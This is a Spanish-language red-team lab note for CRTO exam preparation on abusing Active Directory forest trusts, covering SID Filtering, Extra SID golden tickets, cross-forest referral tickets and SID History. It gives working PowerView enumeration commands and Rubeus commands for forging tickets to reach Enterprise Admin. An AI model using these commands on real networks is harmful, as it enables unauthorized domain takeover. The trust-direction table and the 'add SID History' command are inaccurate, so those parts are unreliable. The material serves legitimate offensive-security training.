# Technique — Lab-15 Forest Reign

> **Capability (eje didáctico):** Forest & Trust Abuse — saltar entre dominios y forests abusando de trusts, SID History, Extra SIDs y SID Filtering desactivado.
> **Bloque CRTO:** Cross-Forest Attacks (el núcleo de los flags difíciles del examen — las cadenas de trust dan la nota alta).
> **Arquetipo:** Operación (A) — kill-chain real. El `execution/` es el plan de ataque.
> **Adversario (escenario):** APT10 / Cloud Hopper — ver [`emulation.md`](emulation.md). **El encaje más genuino de Phase-04.**
> **Contexto previo:** Lab-05 (Silver Chain) y Lab-06 (Black Policy) cubrieron trusts en Phase-02. Este lab es la síntesis enterprise: múltiples forests, SID Filtering real, flags de examen de dificultad alta.

---

## 1. Fundamentos de trusts en AD

Un **trust** es una relación de autenticación entre dos dominios que permite a usuarios de uno autenticarse en recursos del otro.

| Tipo | Dirección | Qué permite |
|------|-----------|-------------|
| **One-way (inbound)** | A confía en B | Usuarios de B acceden a recursos de A |
| **One-way (outbound)** | A confía en B | Usuarios de A acceden a recursos de B |
| **Two-way / bidireccional** | A↔B | Acceso mutuo |
| **Forest trust** | Entre forests completos | Todo el forest confía en el otro (transitivo dentro del forest) |
| **External trust** | Entre dominios de forests distintos | No transitivo |
| **Child→Parent (intra-forest)** | Automático | Todos los dominios de un forest se confían transitivamente |

**La pregunta del operador:** si comprometo un dominio, ¿qué trusts existen desde él? ¿Hacia dónde puedo saltar? ¿Qué SID Filtering está activo?

## 2. SID Filtering — la defensa clave

SID Filtering es el mecanismo que **evita que los SIDs de un dominio confiado sean reconocidos como privilegiados en el dominio que confía**.

- **Activo (por defecto en forest trusts):** los SIDs extra del ticket (incluido SID History) que pertenecen al dominio confiado son filtrados. No puedes escalar con SID History cross-forest.
- **Desactivado:** los SIDs extra del ticket pasan — se puede abusar de SID History para tener privilegios en el dominio de destino.

**Cómo comprobar:**
```powershell
# Desde PowerView
Get-DomainTrust | select SourceName,TargetName,TrustAttributes
# TrustAttributes con "QUARANTINED" = SID Filtering activo
# Sin "QUARANTINED" = SID Filtering desactivado (abusable)

nltest /domain_trusts /all_trusts
```

> En el entorno CRTO los trusts están configurados **sin SID Filtering** — es un lab, se aprende con el camino abierto. En un entorno real, SID Filtering suele estar activo en trusts entre organizations distintas.

## 3. Intra-forest: Child Domain → Parent Domain

Dentro de un forest, todos los dominios confían entre sí transitivamente y **no hay SID Filtering**. Si comprometes un dominio hijo, puedes escalar al dominio raíz del forest con un **Extra SID Attack**.

**Qué necesitas:**
- Hash krbtgt del dominio hijo (DCSync en el hijo).
- SID del grupo Enterprise Admins del forest raíz.

```powershell
# 1. Obtener SID del dominio hijo y del forest raíz
Get-DomainSID -Domain child.corp.local
Get-DomainGroup -Domain corp.local -Identity "Enterprise Admins" | select objectsid

# 2. Forjar ticket inter-realm (Rubeus)
Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<child_SID> `
  /krbtgt:<child_krbtgt_hash> /sids:<EA_SID> /ptt

# 3. Acceder al DC del forest raíz
ls \\dc.corp.local\c$
```

> Este es el ataque más examinado en CRTO cuando hay forest multi-dominio.

## 4. Cross-forest: abuso de forest trust (SID Filtering desactivado)

Si el trust inter-forest tiene SID Filtering desactivado:

```powershell
# Con TGT del dominio A y trust key (o krbtgt del dominio B)
# Solicitar inter-realm TGT hacia forest B
Rubeus.exe asktgt /user:user_A /domain:corp.local /rc4:<hash>

# Solicitar referral ticket hacia el otro forest
Rubeus.exe asktgs /service:krbtgt/ext.local /ticket:<TGT_A.kirbi>

# Usar el referral para acceder a recursos del forest B
```

## 5. SID History Abuse

Si una cuenta tiene SIDs de grupos privilegiados del dominio de destino en su atributo `SIDHistory`, esos SIDs se incluyen en su TGT — y si SID Filtering está desactivado, el dominio de destino los reconoce.

```powershell
# Comprobar SID History de una cuenta
Get-DomainUser -Identity usuario | select sidhistory

# Añadir SID History (requiere DA en el dominio origen)
Add-DomainObjectAcl -TargetIdentity usuario -Rights DCSync  # alternativa
```

## 6. La cadena de trusts del entorno CRTO

El laboratorio tiene varios forests con trusts configurados (atackcorp.local, corp.local, ext.local, child.atackcorp.local). La ruta de compromiso sigue los trusts:

```
child.atackcorp.local ──trust──► atackcorp.local ──trust──► corp.local
                                                  ──trust──► ext.local
```

El operador que mapea esta cadena y entiende qué SID Filtering hay en cada tramo puede planificar el camino completo cross-forest.

## 7. MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|----|
| Lateral Movement | Use Alternate Auth: Pass-the-Ticket | T1550.003 |
| Privilege Escalation | Domain Policy Modification (SID History) | T1484 |
| Discovery | Domain Trust Discovery | T1482 |
| Credential Access | Forge Kerberos Tickets | T1558.001 |

## 8. Key Takeaways

1. **Los trusts son los puentes; SID Filtering son los guardias.** Entender ambos decide el camino.
2. **Child → Parent es el más examinado.** Dentro del forest no hay SID Filtering — el Extra SID Attack siempre funciona.
3. **SID Filtering activo no significa "imposible".** Hay técnicas de coerción y abuso de cuentas extranjeras que funcionan aunque SID Filtering esté activo.
4. **La cadena de trusts es el mapa del ataque.** Enumerar primero, planificar el camino completo, escalar salto a salto.
5. **Las cadenas de trust dan la nota alta en el examen.** Los flags cross-forest son los más difíciles y los que más puntúan.

## Referencias

- The Hacker Recipes — Trusts & Extra SIDs
- MITRE ATT&CK — T1482, T1550.003, T1558.001
- Rubeus / Mimikatz — documentación
- Lab-06 (Black Policy): GPO cross-forest en Phase-02
- CRTO — Forest & Domain Trusts module

---

*Technique · Lab-15 Forest Reign · Forest & Trust Abuse (anatomía v3.1, arquetipo operación)*
